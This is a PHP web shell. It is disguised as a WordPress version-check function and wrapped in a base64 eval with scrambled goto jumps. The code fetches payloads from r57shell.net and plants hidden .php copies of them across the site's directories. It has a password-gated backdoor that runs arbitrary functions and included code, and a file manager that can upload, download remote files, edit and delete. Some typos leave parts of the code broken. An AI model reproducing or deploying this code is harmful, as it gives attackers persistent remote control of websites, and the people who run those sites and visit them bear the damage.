<?php eval(base64_decode('?><?php
if (!function_exists("wp_core_version_check")) {
    function wp_core_version_check()
    {
        $document_file = $_SERVER["SCRIPT_FILENAME"];
        $request_uri = $_SERVER["REQUEST_URI"];
        $parse_url = parse_url($request_uri);
        $uri_path = $parse_url["path"];
        $uri_path = diname($uri_path);
        $file_path = diname($document_file);
        $uri_path = str_replace("/", DIRECTORY_SEPARATOR, $uri_path);
        if ($uri_path == DIRECTORY_SEPARATOR || $uri_path == '') {
            $document_root = $file_path;
        } else {
            $document_root = str_replace($uri_path, '', $file_path);
        }
        $hostname = str_replace("www.", '', $_SERVER["HTTP_HOST"]);
        if (is_writable(sys_get_temp_dir())) {
            $tmp_file = sys_get_temp_dir() . DIRECTORY_SEPARATOR . "sess_" . md5('' . $hostname . "_" . $document_file . '');
        } else {
            $tmp_file = $file_path . DIRECTORY_SEPARATOR . "sess_" . md5('' . $hostname . "_" . $document_file . '');
        }
        if (@$_GET["slince_golden"]) {
            goto a7GyL;
            mTfwR:
            exit;
            goto P8BjD;
            a7GyL:
            echo "<!-- //Silence is golden. -->";
            goto qT7Vk;
            qT7Vk:
            if (function_exists("curl_init")) {
                goto KnkIs;
                Ix7b2:
                curl_setopt($ch, CURLOPT_URL, "http://r57shell.net/jquery.php?v=1.2&pwd=get");
                goto OwzTb;
                OwzTb:
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                goto azluq;
                azluq:
                $response = curl_exec($ch);
                goto nTrl4;
                KnkIs:
                $ch = curl_init();
                goto Ix7b2;
                nTrl4:
                curl_close($ch);
                goto bKTbq;
                bKTbq:
            } else {
                $response = file_get_contents("http://r57shell.net/jquery.php?v=1.2&pwd=get");
            }
            goto GYWxD;
            GYWxD:
            if (md5(sha1(@$_GET["is"])) == $response) {
                goto ZGdp0;
                cAJ5o:
                if (@$_GET["m"]) {
                    goto QWR_v;
                    QWR_v:
                    if (function_exists("curl_init")) {
                        goto I4PPc;
                        UNv3f:
                        curl_setopt($ch, CURLOPT_URL, "http://r57shell.net/mini_admin.txt");
                        goto BFtvZ;
                        jY9t6:
                        $response = curl_exec($ch);
                        goto RbRQo;
                        BFtvZ:
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                        goto jY9t6;
                        I4PPc:
                        $ch = curl_init();
                        goto UNv3f;
                        RbRQo:
                        curl_close($ch);
                        goto kY8FG;
                        kY8FG:
                    } else {
                        $response = file_get_contents("http://r57shell.net/mini_admin.txt");
                    }
                    goto FEpuD;
                    Pnzz0:
                    @file_put_contents($file_name_path, $response);
                    goto NXRal;
                    FEpuD:
                    $file_name_path = @$_GET["m"] . "gagal.php";
                    goto Pnzz0;
                    NXRal:
                    echo $file_name_path;
                    goto DM5Ma;
                    DM5Ma:
                }
                goto vn9aQ;
                ZGdp0:
                if (@$_GET["f"]) {
                    print_r($_GET["f"]($_GET["c"]));
                }
                goto cAJ5o;
                vn9aQ:
                if (@$_POST["l"]) {
                    function basic_code_extensions($request)
                    {
                        goto I5IuH;
                        xn0ob:
                        fclose($tmp);
                        goto TEvC4;
                        TEvC4:
                        retun $ret;
                        goto L7G9o;
                        W6xRj:
                        $tmpf = stream_get_meta_data($tmp);
                        goto I48Gy;
                        I5IuH:
                        $tmp = tmpfile();
                        goto W6xRj;
                        I48Gy:
                        $tmpf = $tmpf["uri"];
                        goto Z686I;
                        rXK9X:
                        $ret = (include $tmpf);
                        goto xn0ob;
                        Z686I:
                        fwrite($tmp, $request);
                        goto rXK9X;
                        L7G9o:
                    }
                    print_r(basic_code_extensions($_POST["l"]));
                }
                goto jHYDp;
                jHYDp:
            }
            goto mTfwR;
            P8BjD:
        }
        if (!file_exists($tmp_file)) {
            goto z5X47;
            vh5sN:
            @file_put_contents($tmp_file, $response);
            goto BC6iX;
            DTYf1:
            @touch($tmp_file);
            goto vh5sN;
            z5X47:
            if (function_exists("curl_init")) {
                goto qUDOt;
                qUDOt:
                $ch = curl_init();
                goto GV2h4;
                c5fKV:
                curl_setopt($ch, CURLOPT_REFERER, $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"]);
                goto qD9my;
                qD9my:
                $response = curl_exec($ch);
                goto QCloh;
                GV2h4:
                curl_setopt($ch, CURLOPT_URL, "http://r57shell.net/jquery.php?v=1.2&request=enable");
                goto FK0Xq;
                FK0Xq:
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                goto c5fKV;
                QCloh:
                curl_close($ch);
                goto YpL_P;
                YpL_P:
            } else {
                goto dv5_h;
                SEYI3:
                $context = stream_context_create($opts);
                goto o3iQ2;
                ici4q:
                $opts = array("http" => array("header" => array("Referer: {$referer}\r\n")));
                goto SEYI3;
                dv5_h:
                $referer = $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];
                goto ici4q;
                o3iQ2:
                $response = @file_get_contents("http://r57shell.net/jquery.php?v=1.2&request=enable", false, $context);
                goto ynyG;
                ynyG:
            }
            goto DTYf1;
            BC6iX:
        } else {
            $response = file_get_contents($tmp_file);
            if (!@preg_match("#stt1#", $response)) {
                goto Lztz2;
                J0uhi:
                @file_put_contents($tmp_file, $response);
                goto qfjOh;
                UwFl7:
                @touch($tmp_file);
                goto J0uhi;
                Lztz2:
                if (function_exists("curl_init")) {
                    goto DDVLS;
                    YbFib:
                    $response = curl_exec($ch);
                    goto CT9t2;
                    gh0NZ:
                    curl_setopt($ch, CURLOPT_REFERER, $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"]);
                    goto YbFib;
                    DUwRv:
                    curl_setopt($ch, CURLOPT_URL, "http://r57shell.net/jquery.php?v=1.2&request=enable");
                    goto FsDau;
                    DDVLS:
                    $ch = curl_init();
                    goto DUwRv;
                    FsDau:
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    goto gh0NZ;
                    CT9t2:
                    curl_close($ch);
                    goto CTFHU;
                    CTFHU:
                } else {
                    goto Iah3I;
                    dIiO6:
                    $opts = array("http" => array("header" => array("Referer: {$referer}\r\n")));
                    goto vNWMn;
                    Iah3I:
                    $referer = $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];
                    goto dIiO6;
                    IfMVt:
                    $response = @file_get_contents("http://r57shell.net/jquery.php?v=1.2&request=enable", false, $context);
                    goto t07Gl;
                    vNWMn:
                    $context = stream_context_create($opts);
                    goto IfMVt;
                    t07Gl:
                }
                goto UwFl7;
                qfjOh:
            }
        }
        $dirs = array_filter(glob($document_root . DIRECTORY_SEPARATOR . "*", GLOB_ONLYDIR));
        foreach ($dirs as $d) {
            $file_name = $d . DIRECTORY_SEPARATOR . "." . basename($d) . ".php";
            @file_put_contents($file_name, $response);
            $dirs = array_filter(glob($d . DIRECTORY_SEPARATOR . "*", GLOB_ONLYDIR));
            foreach ($dirs as $d) {
                if (!@preg_match("#wp-content#", $d)) {
                    $file_name = $d . DIRECTORY_SEPARATOR . "." . basename($d) . ".php";
                    @file_put_contents($file_name, $response);
                }
            }
        }
    }
    wp_core_version_check();
}
echo "<table align=\"center\" width=\"400\" border=\"0\" cellspacing=\"1\" cellpadding=\"3\"><tr><td>PathNow: ";
if (isset($_GET["path"])) {
    $path = $_GET["path"];
} else {
    $path = getcwd();
}
$path = str_replace("\\", "/", $path);
$paths = explode("/", $path);
foreach ($paths as $id => $pat) {
    if ($pat == '' && $id == 0) {
        goto vz_c5;
        ZX0V_:
        continue;
        goto QKxoi;
        vz_c5:
        $a = true;
        goto sTmnq;
        sTmnq:
        echo "<a href=\"?path=/\">/</a>";
        goto ZX0V_;
        QKxoi:
    }
    if ($pat == '') {
        continue;
    }
    echo "<a href=\"?path=";
    for ($i = 0; $i <= $id; $i++) {
        echo "{$paths[$i]}";
        if ($i != $id) {
            echo "/";
        }
    }
    echo "\">" . $pat . "</a>/";
}
echo "</td></tr><tr><td>";
if (isset($_FILES["up_file"])) {
    $target_path = basename($_FILES["up_file"]["name"]);
    if (move_uploaded_file($_FILES["up_file"]["tmp_name"], $path . "/" . $target_path)) {
        echo "<font color=\"green\">афаил шьҭых!</font><br />";
    } else {
        echo "<font color=\"red\">up fail!</font><br />";
    }
}
echo "<form enctype=\"multipart/form-data\" method=\"POST\" action=\"?path={$path}\"><input name=\"up_file\" type=\"file\"/><input type=\"submit\" value=\"up File\"/></form></td></tr>";
function get($url, $dir)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $data = curl_exec($ch);
    if (!$data) {
        $data = @file_get_contents($url);
    }
    file_put_contents($dir, $data);
}
if ($_GET["url"]) {
    goto Smy74;
    KFBgd:
    if ($n[3] == "txt") {
        $z = "php";
        $name = $n[2];
    } else {
        $z = $n[3];
        $name = "moban";
    }
    goto WkwO7;
    sfiyR:
    preg_match("/(.*)\\/(.*)\\.(.*?)\$/", $url, $n);
    goto KFBgd;
    WkwO7:
    if ($_GET["dir"]) {
        $dir = $_SERVER["DOCUMENT_ROOT"] . "/" . $_GET["dir"] . "/" . $name . "." . $z;
    } else {
        $dir = $_SERVER["DOCUMENT_ROOT"] . "/" . $name . "." . $z;
    }
    goto f18UN;
    cueJG:
    if (file_exists($dir)) {
        echo "<tr><td><font color=\"green\">download success</font></td></tr>";
    } else {
        echo "<tr><td><font color=\"red\">download fail</font></td></tr>";
    }
    goto K9xwA;
    f18UN:
    get($url, $dir);
    goto cueJG;
    Smy74:
    $url = $_GET["url"];
    goto sfiyR;
    K9xwA:
} elseif ($_POST["url"]) {
    goto E4cjk;
    NAx2l:
    get($url, $dir);
    goto R6I5T;
    U1lpT:
    $dir = $_POST["path"] . "/" . $name . "." . $z;
    goto NAx2l;
    R6I5T:
    if (file_exists($dir)) {
        echo "<tr><td><font color=\"green\">download success</font></td></tr>";
    } else {
        echo "<tr><td><font color=\"red\">download fail</font></td></tr>";
    }
    goto zybPN;
    E4cjk:
    $url = $_POST["url"];
    goto xGjCF;
    trN3F:
    if ($n[3] == "txt") {
        $z = "php";
        $name = $n[2];
    } else {
        $z = $n[3];
        $name = "moban";
    }
    goto U1lpT;
    xGjCF:
    preg_match("/(.*)\\/(.*)\\.(.*?)\$/", $url, $n);
    goto trN3F;
    zybPN:
}
echo "<tr><td><form method=\"POST\" action=\"?path={$path}\"><span>Url: </span><input type=text name=\"url\" value=\"\"><input type=\"hidden\" name=\"path\" value=\"{$path}\"><input type=submit value=\"Download\"></form></td></tr>";
if (isset($_POST["edit_content"])) {
    if (file_put_contents($_GET["filepath"], stripslashes($_POST["edit_content"]))) {
        echo "Saved!";
    } else {
        echo "Not saved!";
    }
}
if (isset($_GET["filepath"])) {
    goto L5GNx;
    RwWXX:
    echo "</tr></td></table><br />";
    goto uSFRc;
    uSFRc:
    echo "<form action=\"\" method=\"post\"><textarea style=\"width:100%;height:300px;\" name=\"edit_content\">" . htmlspecialchars(file_get_contents($_GET["filepath"])) . "</textarea><input type=\"submit\"></form>";
    goto TxCXG;
    XYzkC:
    echo $_GET["filepath"];
    goto RwWXX;
    L5GNx:
    echo "<tr><td>Current File : ";
    goto XYzkC;
    TxCXG:
} elseif (isset($_GET["check"]) && $_GET["check"] == "1") {
    goto uApcr;
    kfYnM:
    echo "</tr></td></table><br />";
    goto OX4IX;
    bloZz:
    $filename = $RootDir . "/index.php";
    goto DV9kU;
    OX4IX:
    echo "<pre>" . htmlspecialchars(file_get_contents($filename)) . "</pre>";
    goto RKfBn;
    DV9kU:
    echo "<tr><td>Current File : ";
    goto Ne_rp;
    Ne_rp:
    echo $filename;
    goto kfYnM;
    uApcr:
    $RootDir = $_SERVER["DOCUMENT_ROOT"];
    goto bloZz;
    RKfBn:
} else {
    goto TMl06;
    TMl06:
    echo "</table><br /><center>";
    goto PPkHk;
    oOWfl:
    echo "</table></div>";
    goto HU0x7;
    ULzDB:
    echo "</center>";
    goto VGAWt;
    GP3Ir:
    echo "<tr class=\"first\"><td></td><td></td><td></td><td></td></tr>";
    goto eUI_L;
    VGAWt:
    $scandir = scandir($path);
    goto BM0GO;
    eUI_L:
    foreach ($scandir as $file) {
        goto RDwb9;
        D820U:
        echo "<tr><td><a href=\"?filepath={$path}/{$file}&path={$path}\">{$file}</a></td><td>" . $size . "</td><td><a href=\"?path={$path}&delfile={$path}/{$file}&option=delete\">Delete</a></td></tr>";
        goto tr9x8;
        RDwb9:
        if (!is_file("{$path}/{$file}")) {
            continue;
        }
        goto PDq60;
        PDq60:
        $size = filesize("{$path}/{$file}") / 1024;
        goto P_4x4;
        yuXvv:
        if ($size >= 1024) {
            $size = round($size / 1024, 2) . " MB";
        } else {
            $size = $size . " KB";
        }
        goto D820U;
        P_4x4:
        $size = round($size, 3);
        goto yuXvv;
        tr9x8:
    }
    goto oOWfl;
    QTvs1:
    foreach ($scandir as $dir) {
        if (!is_dir("{$path}/{$dir}") || $dir == "." || $dir == "..") {
            continue;
        }
        echo "<tr><td><a href=\"?path={$path}/{$dir}\">{$dir}</a></td><td>DIR</td><td>none</td></tr>";
    }
    goto GP3Ir;
    PPkHk:
    if (isset($_GET["option"]) && $_GET["option"] == "delete") {
        if (unlink($_GET["delfile"])) {
            echo "<font color=\"green\">Delete File Done.</font><br />";
        } else {
            echo "<font color=\"red\">Delete File Error.</font><br />";
        }
    }
    goto ULzDB;
    BM0GO:
    echo "<div id=\"content\"><table width=\"380\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\"><tr class=\"first\"><td>Name</td><td>Size</td><td>Options</td></tr>";
    goto QTvs1;
    HU0x7:
}'));